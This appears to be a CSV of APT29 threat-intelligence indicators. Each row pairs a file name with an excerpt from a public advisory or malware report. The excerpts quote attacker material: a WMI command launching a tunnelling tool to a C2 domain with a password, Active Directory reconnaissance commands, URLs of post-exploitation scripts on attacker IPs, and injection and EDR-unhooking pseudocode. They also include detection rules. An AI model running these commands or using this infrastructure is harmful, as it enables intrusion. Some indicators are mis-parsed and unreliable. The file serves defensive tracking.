1.0.0,actor--apt29,artifact--sha256:bbaa06fde2855e8952dfac9384d89a13fcc7d51c3d5c78f120e17048992466b2,observation--sha256:d9d9c0f038a2ff87bbbdec4f083a96569c7ccdd5bd487a8c509bbe9c08371749,file-name,SecurityHealthService.exe,SecurityHealthService.exe,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 10/20 If OPSEC checks are passed, a new thread is spawned. The new thread again executes the same OPSEC- related code blocks (initialize APIs, unhook modules, check for sleep emulation, check for proper parent name) and, if all checks are passed, loads and injects the next stage into a randomly selected process. 1. __int64 InjectThread() 2. { 3. // Reused code blocks have been simplified 4. ResolveAPIs(); 5. UnhookDLLs(); 6. CheckForSleep",
1.0.0,actor--apt29,artifact--sha256:d74505ca700fb22ee16d2dc8bfc83b68c01ebe12ecac7f3afdef8f7983e1cc84,observation--sha256:7d24b96ba4bac65992aefe59a21f421e625fe069c7dbdcbc087562ae93605baa,file-name,Sense.exe,Sense.exe,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 13 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR Windows Management Instrumentation T1047 SVR cyber actors executed Rsockstun either in memory or using Windows Management Instrumentation (WMI) to execute malicious commands and payloads. wmic process call create ""C:\Program Files\Windows Defender Advanced Threat Protection\Sense.exe -connect poetpages.com -pass M554- 0sddsf2@34232fsl45t31"" Table 10: SVR Cyber Actors ATT&CK Techniques for Enterprise: Command and ",
1.0.0,actor--apt29,artifact--sha256:d74505ca700fb22ee16d2dc8bfc83b68c01ebe12ecac7f3afdef8f7983e1cc84,observation--sha256:e4bc485c35a1eee52cc2e7de0ed5b85f60d914a2dc1094549dbf3ed619f9c4ad,file-name,Sense.exe,Sense.exe,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 7 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  Get-NetComputer  Get-NetGroup  Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount""  Get-NetDiDomain  Get-AdUser  Get-DomainUser -UserName  Get-NetUser -PreauthNotRequire  Get-NetComputer | select samaccountname  Get-NetUser -SPN | select serviceprincipalname Tunneling into Compromised Environments In selected environments the SVR used an ad",
1.0.0,actor--apt29,artifact--sha256:c7c93ead40d932fa2437cbe3ea96e607dca5c2aa9e4bc568dd03ffaf911a719c,observation--sha256:e9a43ccdd20b72c8dec0be02eee16844881b5c868091be86f97f0272fecb659e,file-name,SessionGopher.ps1,SessionGopher.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 45}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group 6.9 Javascript Injection Points jenkins.findfwd.com/sk-jspark_init.php test.directfwd.com/sk-jspark_init.php securesearchnow.com/sk-jspark_init.php alertmeter.info/sk-jspark_init.php freeresultsguide.com/sk-jspark_init.php 6.10 External Post-Exploitation Scripts 141.136.0.4/46tt83y6.ps1 173.232.146.12/Invoke-SocksProxy.psm1 176.10.118.136/pwrvw.ps1 179.43.141.188:80/46tt83y6.ps1 179.43.141.188:81/46tt83y6.ps1 179.43.141.188:82/46tt83y6.ps1 179.43.141.188:83/46tt83y,
1.0.0,actor--apt29,artifact--sha256:924dc29c147dc580007662e66a608cbc48553467a26d3012edff58933b5a150e,observation--sha256:fe7ec80d414087e186c8d21b6025753949870641d13e12e516663140117fc87d,file-name,SilverFish_TLPWHITE.pdf,SilverFish_TLPWHITE.pdf,candidate,,unknown,unknown,not-stated,,source--apt29--1ee47db73b8b0868,SunBurst/README.MD,"{""line"": 5}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,text-line,https://www.prodaft.com/m/uploads/SilverFish_TLPWHITE.pdf,
1.0.0,actor--apt29,artifact--sha256:6ace16e60fb34d1a53f06326fcc2f364d59d3ea31151662282423cfea1ebf0da,observation--sha256:78c4a7a291e6e8d2b6a783662dbde3ee40955541769bd7b9d277e35f5646b1e9,file-name,Svchost.exe,Svchost.exe,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 10/20 If OPSEC checks are passed, a new thread is spawned. The new thread again executes the same OPSEC- related code blocks (initialize APIs, unhook modules, check for sleep emulation, check for proper parent name) and, if all checks are passed, loads and injects the next stage into a randomly selected process. 1. __int64 InjectThread() 2. { 3. // Reused code blocks have been simplified 4. ResolveAPIs(); 5. UnhookDLLs(); 6. CheckForSleep",
1.0.0,actor--apt29,artifact--sha256:213c3dd7f6f9c9a53d4186227e09b1768a95673af15879e888fc70bd232c4993,observation--sha256:74f0bbf5418026086b9cd79b3bc8ffa420fd247ca01a00f7d0df698f3c693c94,file-name,TaskHostW.exe,TaskHostW.exe,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 10/20 If OPSEC checks are passed, a new thread is spawned. The new thread again executes the same OPSEC- related code blocks (initialize APIs, unhook modules, check for sleep emulation, check for proper parent name) and, if all checks are passed, loads and injects the next stage into a randomly selected process. 1. __int64 InjectThread() 2. { 3. // Reused code blocks have been simplified 4. ResolveAPIs(); 5. UnhookDLLs(); 6. CheckForSleep",
1.0.0,actor--apt29,artifact--sha256:f14d539063d6cc603d9c290611b467f7cc33de45a5e5d0b62cace45fb2ea2ea6,observation--sha256:637d981f34690be8719886f2f1e88ecdc3607f99888c3d25c25d24684f420fac,file-name,USER32.DLL,USER32.DLL,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 44}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,S2GRUPO | LAB5243 Table 6. Libraries and functions resolved by the first code block LIBRARY API KERNEL32.DLL GetProcessHeap HeapAlloc HeapFree VirtualAlloc VirtualProtect VirtualFree ExitProcess GetSystemFirmwareTable GetVersionExA ADVAPI32.DLL RegOpenKeyExA RegQueryValueExA RegCloseKey MD5Init MD5Update MD5Final USER32.DLL wsprintfA MessageBoxA OLE32.DLL CoInitialize CoInitializeSecurity CoInitializeInstance CoCreateInstance CoSetProxyBlanket CoUninitialize OLEAUT32.DLL VariantClear VariantInit,
1.0.0,actor--apt29,artifact--sha256:d76aadef7dc2b129932fc89cd0c41d516535277ad683a332b7e9fde5496d5a40,observation--sha256:523344bb81228d83547fe0c257c6c7f4838c85ffec6e45bd0a3be10d98f497b3,file-name,UnregisterAncestorAppendAuto.dll,UnregisterAncestorAppendAuto.dll,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 17 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR references: author: date: 2023/11/15 logsource: category: image_load product: windows detection: selection: ImageLoaded|endswith: - 'AclNumsInvertHost.dll' - 'ModeBitmapNumericAnimate.dll' - 'UnregisterAncestorAppendAuto.dll' - 'DeregisterSeekUsers.dll' - 'ScrollbarHandleGet.dll' - 'PerformanceCaptionApi.dll' - 'WowIcmpRemoveReg.dll' - 'BlendMonitorStringBuild.dll' - 'HandleFrequencyAll.dll' - 'HardSwapColor.dll',
1.0.0,actor--apt29,artifact--sha256:c7249a1d5cca3b37f6628d7039da7a23b073431ea7bac600e890d811d5dc0610,observation--sha256:dec425e869ac639bb54c6b08ff761da18bc4cc00eeecc5f7d55f5f9de1ac5dac,file-name,VCRUNTIME140.dll,VCRUNTIME140.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 30/36 YARA Rule A rule that can be used to scan for QUARTERRIG: rule apt29_QUARTERRIG { strings: $str_dll_name = ""hijacker.dll"" $str_import_name = ""VCRUNTIME140.dll"" // 48 8B 15 39 6A 00 00 mov rdx, cs:api_stuff.OpenThread // 48 8D 0D FA 68 00 00 lea rcx, api_stuff // 8B D8 mov ebx, eax // E8 3F 25 00 00 call load_api_addr // 44 8B C3 mov r8d, ebx // 33 D2 xor edx, edx // B9 FF FF 1F 00 mov ecx, 1FFFFFh // FF D0 call rax $op_resolve_and_c",
1.0.0,actor--apt29,artifact--sha256:2c8402bb61192f468a817acdb3212bc275bc1382ee42c507f6844705bba3a071,observation--sha256:50414079affaade4f10c3ea72718453c42e307d9ca30173a0818d0bc82f47b6c,file-name,VSIXAutoUpdate.exe,VSIXAutoUpdate.exe,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:3b69995ead624503cab7cfb86101f4f87ee4ba3bd4282077a7a356fa769d7430,observation--sha256:df4cba2708dead520b105c7f7743101dffb525f0b7b6864fae80edf19a5da4bb,file-name,Vcruntime140.dll,Vcruntime140.dll,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 7/24 Container File – ZIP In October 2022, the adversary used a ZIP archive to deliver SNOWYAMBER. Schedule.zip contained the following files: . ├── 7za.dll ├── november_schedul exe.pdf └── vcruntime140.dll Filename november_schedulexe.pdf uses the right-to-left override technique to attempt to mimic the pdf extension while in fact, it is .exe. The file is a renamed, legitimate 7-zip executable. Vcruntime140.dll is a benign, although modi",
1.0.0,actor--apt29,artifact--sha256:9541c49a6c0c8bb148d466012a62ae21da5b109db2c39fd2712acb604dd5ce2c,observation--sha256:4f77f9611fbe1b9a8b99d3882946caa1e8db95b2bc04bbf2ea7039a635ce42f4,file-name,Video.zip,Video.zip,candidate,,unknown,unknown,not-stated,,source--apt29--49eb8cd46560323f,APT29/F-Secure_Dukes_Whitepaper.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"F-Secure Whitepaper, September 2015 15 The first CosmicDuke sample we observed after the initial research on CosmicDuke was a sample compiled on the 30th of July 2014. The loader used by the sample purported to have been compiled on the 25th of March 2010. Due to artefacts left in the loader during compilation time however, we know that it used a specific version of the Boost library, 1.54.0, that was only published on the 1st of July 2013 [12]. The compilation timestamp therefore had to have be",
1.0.0,actor--apt29,artifact--sha256:0ad09e7868e35580bf79a30a8d7b01cd9376c97f12b66672f990006986363b6e,observation--sha256:30ea9729557a3f64f32dfd249b3bd636432eecbf5879defe88534c0ae2b9d73a,file-name,WINWORD.EXE,WINWORD.EXE,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 5/20 Phishing – Email and Delivery Script Phishing email uses a PDF attachment with a link to the ENVYSCOUT embedded inside. The email itself does not contain any additional malicious content. The lure is consistent with themes of previously observed APT29 phishing emails. HALFRIG has been delivered using a slightly modified, but well-known delivery script called ENVYSCOUT and linked to the APT29 and NOBELIUM activity sets. Container File",
1.0.0,actor--apt29,artifact--sha256:0ad09e7868e35580bf79a30a8d7b01cd9376c97f12b66672f990006986363b6e,observation--sha256:ffcdebd0e6e7577a405e3bea1b29a8f7e609bda607485907bb9194629c121797,file-name,WINWORD.EXE,WINWORD.EXE,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 6/20 HALFRIG Analysis HALFRIG is a simplistic but heavily obfuscated stager. It is written in C and uses WINAPI to facilitate most capabilities. The execution chain is split into 4 DLL files, each responsible for a small part of overall capability5 – i.e. setting up persistence. Aside from obfuscation (which we were not able to link to any open source/publicly available tool), HALFRIG incorporates OPSEC techniques to unhook EDR, verify if",
1.0.0,actor--apt29,artifact--sha256:0ad09e7868e35580bf79a30a8d7b01cd9376c97f12b66672f990006986363b6e,observation--sha256:2b86aa79a5ac845d3f691bd7cfc772ea2010f849ce729916f00a5f2eb0df7d99,file-name,WINWORD.EXE,WINWORD.EXE,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 7/20 The adversary uses AppvIsvSubsystems64.dll import to facilitate HALFRIG execution. The following flowchart illustrates the module execution process: Figure 4 - HALFRIG execution flowchart AppvIsvSubsystems64.dll The first DLL to be loaded and executed by renamed WINWORD.EXE is AppvIsvSubsystems64.dll. This DLL simply spawns a new thread that resolves APIs and loads the next module. Figure 5 - DllMain function of the first stage of HA,
1.0.0,actor--apt29,artifact--sha256:c5d3d6f4ec32a2537e230902b537f99640f0672386d78445b58fcb85272002f7,observation--sha256:e6cfd09a34ee96172c273ccc7c7130348cd28185ed04da95ccedcf3f8d31614e,file-name,WINWORD.exe,WINWORD.exe,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 6/20 HALFRIG Analysis HALFRIG is a simplistic but heavily obfuscated stager. It is written in C and uses WINAPI to facilitate most capabilities. The execution chain is split into 4 DLL files, each responsible for a small part of overall capability5 – i.e. setting up persistence. Aside from obfuscation (which we were not able to link to any open source/publicly available tool), HALFRIG incorporates OPSEC techniques to unhook EDR, verify if",
1.0.0,actor--apt29,artifact--sha256:1b7c8a95784858c236ba8c8e20981580a948901f14b810085378dcbe08bd8dfc,observation--sha256:ec2e3ae539638054582cb21d56ab112e8f1b0bb109a8b0d22e7a30b94bb340e9,file-name,WMIC.exe,WMIC.exe,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 15 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR selection: Image|endswith: - 'whoami.exe' CommandLine|contains: - 'priv' - 'PRIV' condition: selection falsepositives: legitimate use by system administrator title: DC listing via nltest description: Detects nltest.exe execution and DC listing author: references: date: 2023/11/15 logsource: category: process_creation product: windows detection: selection: Image|endswith: - 'nltest.exe' CommandLine|re: '.*dclist\:,
1.0.0,actor--apt29,artifact--sha256:e0c9f6e58bb4fcf39ee5aa3b7518245fd9278b16b3558ea0c289f24b7c12a007,observation--sha256:3afea5ae92eaa01857ce37069d57be7784eeaa1a742b1c6ea69c37dbab8a58f0,file-name,WowIcmpRemoveReg.dll,WowIcmpRemoveReg.dll,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 17 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR references: author: date: 2023/11/15 logsource: category: image_load product: windows detection: selection: ImageLoaded|endswith: - 'AclNumsInvertHost.dll' - 'ModeBitmapNumericAnimate.dll' - 'UnregisterAncestorAppendAuto.dll' - 'DeregisterSeekUsers.dll' - 'ScrollbarHandleGet.dll' - 'PerformanceCaptionApi.dll' - 'WowIcmpRemoveReg.dll' - 'BlendMonitorStringBuild.dll' - 'HandleFrequencyAll.dll' - 'HardSwapColor.dll',
1.0.0,actor--apt29,artifact--sha256:8daf3ed67fb40d9be32da9e3c28f8a6a03677735abaee1b2fc3ab7dc9d5f017b,observation--sha256:cd9f5420c661c586100911d848d0cbbedafb850720cdebe93f36290fb7736ee5,file-name,ZTS Device Compatibility Test.rdp,ZTS Device Compatibility Test.rdp,confirmed,2024-10-01T00:00:00Z,month,known,column:observed_at,2024-10-29T00:00:00Z,source--microsoft-apt29-rdp-2024,profiles/apt29/osint-observables/microsoft-rdp-2024.csv,"{""row"": 294}","[""activity--apt29-rdp-phishing-2024""]",[],"[""infra--apt29-actor-controlled-rdp""]","[""phishing-attachment""]",1,false,high,TLP:CLEAR,csv-row,ZTS Device Compatibility Test.rdp file-name 2024-10 activity--apt29-rdp-phishing-2024 infra--apt29-actor-controlled-rdp phishing-attachment,All 281 published domains and 14 unique RDP attachment names extracted from the source IOC section.
1.0.0,actor--apt29,artifact--sha256:9d7998f67d1c0558906fd61113436bda05bd256bdf494f471a1f70a32b42c2fd,observation--sha256:2d11790b3fa0dcf6d8a6d809f5cc683ea7c486bb77b17b4969841cc03a233dfd,file-name,Zero Trust Architecture Configuration.rdp,Zero Trust Architecture Configuration.rdp,confirmed,2024-10-01T00:00:00Z,month,known,column:observed_at,2024-10-29T00:00:00Z,source--microsoft-apt29-rdp-2024,profiles/apt29/osint-observables/microsoft-rdp-2024.csv,"{""row"": 295}","[""activity--apt29-rdp-phishing-2024""]",[],"[""infra--apt29-actor-controlled-rdp""]","[""phishing-attachment""]",1,false,high,TLP:CLEAR,csv-row,Zero Trust Architecture Configuration.rdp file-name 2024-10 activity--apt29-rdp-phishing-2024 infra--apt29-actor-controlled-rdp phishing-attachment,All 281 published domains and 14 unique RDP attachment names extracted from the source IOC section.
1.0.0,actor--apt29,artifact--sha256:78fa5e000d9b75cec0a1676632661bb1ecae64f6b72ac56d4036b44a37496025,observation--sha256:c60179704d3029a0ebb9493e38a35394d8279a519d63bb0e71267001753f3d4f,file-name,Zero Trust Security Environment Compliance Check.rdp,Zero Trust Security Environment Compliance Check.rdp,confirmed,2024-10-01T00:00:00Z,month,known,column:observed_at,2024-10-29T00:00:00Z,source--microsoft-apt29-rdp-2024,profiles/apt29/osint-observables/microsoft-rdp-2024.csv,"{""row"": 296}","[""activity--apt29-rdp-phishing-2024""]",[],"[""infra--apt29-actor-controlled-rdp""]","[""phishing-attachment""]",1,false,high,TLP:CLEAR,csv-row,Zero Trust Security Environment Compliance Check.rdp file-name 2024-10 activity--apt29-rdp-phishing-2024 infra--apt29-actor-controlled-rdp phishing-attachment,All 281 published domains and 14 unique RDP attachment names extracted from the source IOC section.
1.0.0,actor--apt29,artifact--sha256:a85e3f6c75bd1231beb4a8a2716c79d546c7d57923bb5fe52b44d198d363d45a,observation--sha256:12d4b5eee184c5220cabe5cde11d6670d2e820c54f86269cc4fb1e42636f4f76,file-name,advapi.dll,advapi.dll,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS victim’s machine. The DLL is written in C   and contains only 1 export function  DeviceAll), whichsimply returns when called. The actual malicious code is implemented in a thread that is spawned inDLLMain during the DLL’s initialization. Multiple anti-analysis and evasion techniques are usedthroughout the malware including API unhooking, dynamically resolving APIs, string encryption, andsandbox evasion. When GraphicalNeutrino starts a thread, it attempts to remove any API h",
1.0.0,actor--apt29,artifact--sha256:89dba5cabd68a211602271136b9307c636ed8b266f5fad41abfc77486a649c52,observation--sha256:3f9b27d2fa3d4e4ad1d00494e69dae3c0cf55e59106d6bd2af1c3bd4e3233204,file-name,(advapi32.dll,advapi32.dll,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 78}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5277 One of the most notable aspects of this configuration is that the malware has a list of credentials embedded in its code that appear to belong to the affected organization, and which are initially used to browse the Internet through the corporate proxy. This reinforces the theory that we are dealing with Stage:3 malware, i.e. persistent malware within the organization, and exemplifies the meticulous parameterization that the attacker has incorporated into their implants. This i",
1.0.0,actor--apt29,artifact--sha256:3f69bf408c1344ced48b99cd7abad741f702503c1a3df8255c9716b397bc3a04,observation--sha256:bb833df6fcc95de14e9e629900e30a27550e929873f32b48950e7c12e938debe,file-name,alongwithadditionalfilessuchaswindoc.exe,alongwithadditionalfilessuchaswindoc.exe,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS| RUSSIA decrypt thecontentsof theXSD. Thedecryptedcontentscontainshellcodethat isthenexecutedtoextract andloadanembeddedDLL. Inadditiontotheencryptionroutine, theDLLmoduleengagesinadditional detectionevasiontechniquessuchascheckingtoensurethat it isnot runninginasandboxor under adebugger. Afterengagingintheseoperations, themoduleestablishespersistencebycopyingthecontentsof theISOfiletoadirectoryandcreatingaregistryrunkeytoexecutetheEXEduringsystemstartup.Subsequently, it decr",
1.0.0,actor--apt29,artifact--sha256:bc34cc6bc6762f77c28ffaf2ba61efb3f83b58d8144eea72fd331ba983f8af4c,observation--sha256:5f79af3b647c47d70f0b76cd8aa4ff1e75e364c81518de68f9d9e13cde2c7276,file-name,amsi.dll,amsi.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 13}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Spawn new shell session (port 143) Spawn new shell session (port 443) (+amsi.dll patch WIN10 ONLY) Spawn new shell session (port 443) (+amsiInitFailed=true WIN10 ONLY) TEST Spawn new bot instance Spawn new bot instance elevated (slui, build>=9600, WIN8.1, WIN10) powershell required + console shown. Blocked by WD Spawn new bot instance elevated (eventvwr, WIN7, WIN8.1) Spawn new bot instance elevated (sdclt, build>=14393, WIN10) WD alert, instance dies, still works ",
1.0.0,actor--apt29,artifact--sha256:aec24e65eb459048fe82efcea48ba080b6c7e490964d7caad2ed20dd025d75aa,observation--sha256:71f98182f494c8d50255d9db1399215e70ee06009608d779ff9335d43efde095,file-name,api.php,api.php,candidate,,unknown,unknown,not-stated,,source--apt29--d219ac10702e638c,APT29/Advisory Further TTPs associated with SVR cyber actors.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"alert tcp any any -> any any (msg: ""Sliver HTTP implant beacon - signin.php Send""; content:""/signin.php?_=""; pcre:""/\APOST (?:\/(?:api|rest|drupal|wordpress))?\/signin\.php\?_=[0-9]{1,9} HTTP/"";) alert tcp any any -> any any (msg: ""Sliver HTTP implant beacon - api.php Send""; content:""/api.php?_=""; pcre:""/\APOST (?:\/(?:api|rest|drupal|wordpress))?\/api\.php\?_=[0-9]{1,9} HTTP/"";) alert tcp any any -> any any (msg: ""Sliver HTTP implant beacon - samples.php Send""; content:""/samples.php?_=""; pcre:""",
1.0.0,actor--apt29,artifact--sha256:f55dfdeef4a5833bb06e7c056918952724f3fba05f1bcd0e7d16781b2256be70,observation--sha256:945ce4351c7559da8f0e2e3eda4e457715442b7d2210dc62f26557cc0f23824d,file-name,asvcruntime140.dllandphotos_and_price.exe,asvcruntime140.dllandphotos_and_price.exe,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS Once the shellcode is decrypted, it is indirectly spawned in a new thread byabusing FLS callbacks toobtain execution control as shown inFigure 14. Ratherthan specifying the shellcode’s address as thestart address for the thread, NTDLL’s rtlFlsAlloc is used instead. The rtlFlsAlloc function is used toallocatefiber local storageand takes a callbackfunction as an argument. GraphicalNeutrino creates thethread in a suspended state and updates the thread’s context to have the RCX",
1.0.0,actor--apt29,artifact--sha256:75cd0399b25e5629b19b98cfd74f539f3c90e2464807b6775cf8ca54a5e619e0,observation--sha256:97e369170efa511d62daebf12429d0348b770c069eb73dbcea53c7b83c0ce08f,file-name,aysklokucxnif.dll,aysklokucxnif.dll,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 114}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,S2GRUPO | LAB52113 LAB52 managed to obtain various modules from the malware operators with capabilities in this case to carry out the DCSync attack [18]. 3.4.3. 14 Modules used by operators Table 15. DCSync modules MODULE NAME/ HASH (SHA1) EXPORT 1 EXPORT 2 EXPORT 3 aysklokucxnif.dll (edkb8hva) A133ECF19B8531377F7C4377086F46F6BC90BEA2 A2A241608339688B8AEC3432FD93EACF33F1A83A :q53liiet :5ddfnsfv :uuns50 qjhipfahicihh.dll (ae4s) 0E8F10CBFDDB5A2197A9C5246B66165138DF81EE :bed :j8fyvgp :nxazll lechtx,
1.0.0,actor--apt29,artifact--sha256:75cd0399b25e5629b19b98cfd74f539f3c90e2464807b6775cf8ca54a5e619e0,observation--sha256:c1fbb1b692810b110bf67f429bae6d6533b1d06ae59855354fd0e6a7c17eb4d4,file-name,aysklokucxnif.dll,aysklokucxnif.dll,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 127}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,127 S2GRUPO | LAB52 NAME / SHA1 ACCESS aysklokucxnif.dll A133ECF19B8531377F7C4377086F46F6BC90BEA2 A2A241608339688B8AEC3432FD93EACF33F1A83A Private qjhipfahicihh.dll 0E8F10CBFDDB5A2197A9C5246B66165138DF81EE Private lechtxibhsfqj.dll 16AE9E9ABC0C4F84C5AB8D451F2A184FED0B6D46 B1B302C512185146EF793812052DB92D7F3DBD6D Private 6 .1 DCSync Modules,
1.0.0,actor--apt29,artifact--sha256:bb9874aced7a61d6667122ef5b8ba402d7c9acf98e424e35bd1af705d0af2206,observation--sha256:5c579a0cbe5f2c4f66f68e3f53bef8b2e0dce91377edc348d548872917fa8eab,file-name,bmw7.png.lnk,bmw7.png.lnk,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,CYBERTHREATANALYSIS| RUSSIA AppendixA—IndicatorsofCompromise Compromised Domains Associated with BlueBravo Activity:te-as[.]noeasym6[.]comremcolours[.]comsimplesalsamix[.]comsylvio[.]com[.]brreidao[.]commightystake[.]comsharpledge[.]comfondoftravel[.]com URLs Associated with BlueBravo Activity:te-as[.]no/wine[.]phpeasym6[.]com/Information.phpreidao[.]com/dashboard.phpresetlocations[.]com/bmw.htmsimplesalsamix[.]com/e-yazi.htmlsylvio.com[.]br/form.phpmightystake[.]com/sponsorship.phpsharpledge[.],
